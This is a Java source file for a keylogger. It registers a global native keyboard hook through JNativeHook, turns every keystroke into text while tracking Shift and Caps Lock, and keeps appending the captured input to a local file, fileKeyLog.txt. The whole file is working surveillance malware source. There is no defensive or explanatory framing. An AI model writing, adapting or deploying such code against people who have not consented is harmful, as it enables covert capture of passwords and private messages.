import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {
    public static final String path = "fileKeyLog.txt";
    public static String str = "";
    public boolean shift = false;
    public boolean capsLock = false;

    public KeyLogger() {
        LoadKeyLog();
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    public void LoadKeyLog() {
        FileInputStream fin = null;
        try {
            fin = new FileInputStream(path);
            int i = 0;
            while ((i = fin.read()) != -1) {
                str += (char) i;
            }
            fin.close();
        } catch (FileNotFoundException e) {
            System.out.println(e);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public String ConvertKey(String key) {
        if (key == "Space") {
            return " ";
        }
        if (key == "Enter") {
            return "\n";
        }
        if (key == "Alt" || key == "Ctrl") {
            return "";
        }
        if (key == "Shift") {
            this.shift = true;
            return "";
        }
        if (key == "Caps Lock") {
            this.capsLock = !this.capsLock;
            return "";
        }
        if (key == "`" && this.shift) {
            return "~";
        }
        if (key == "1" && this.shift) {
            return "!";
        }
        if (key == "2" && this.shift) {
            return "@";
        }
        if (key == "3" && this.shift) {
            return "#";
        }
        if (key == "4" && this.shift) {
            return "$";
        }
        if (key == "5" && this.shift) {
            return "%";
        }
        if (key == "6" && this.shift) {
            return "^";
        }
        if (key == "7" && this.shift) {
            return "&";
        }
        if (key == "8" && this.shift) {
            return "*";
        }
        if (key == "9" && this.shift) {
            return "(";
        }
        if (key == "0" && this.shift) {
            return ")";
        }
        if (key == "-" && this.shift) {
            return "_";
        }
        if (key == "=" && this.shift) {
            return "+";
        }
        if (key == "[" && this.shift) {
            return "{";
        }
        if (key == "]" && this.shift) {
            return "}";
        }
        if (key == ";" && this.shift) {
            return ":";
        }
        if (key == "'" && this.shift) {
            return "\"";
        }
        if (key == "," && this.shift) {
            return "<";
        }
        if (key == "." && this.shift) {
            return ">";
        }
        if (key == "/" && this.shift) {
            return "?";
        }
        if (key == "\\" && this.shift) {
            return "|";
        }

        if (!this.shift && !this.capsLock)
            return key.toLowerCase();
        if (this.shift && !this.capsLock)
            return key;
        if (!this.shift && this.capsLock)
            return key;
        if (this.shift && this.capsLock)
            return key.toLowerCase();
        return "";
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0) {
        str += ConvertKey(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
        // System.out.println(str);
        FileOutputStream fout = null;
        try {
            fout = new FileOutputStream(path);
            byte b[] = str.getBytes();
            fout.write(b);
            fout.close();
        } catch (FileNotFoundException e) {
            System.out.println(e);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0) {
        if (NativeKeyEvent.getKeyText(arg0.getKeyCode()) == "Shift") {
            this.shift = false;
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {

    }

}
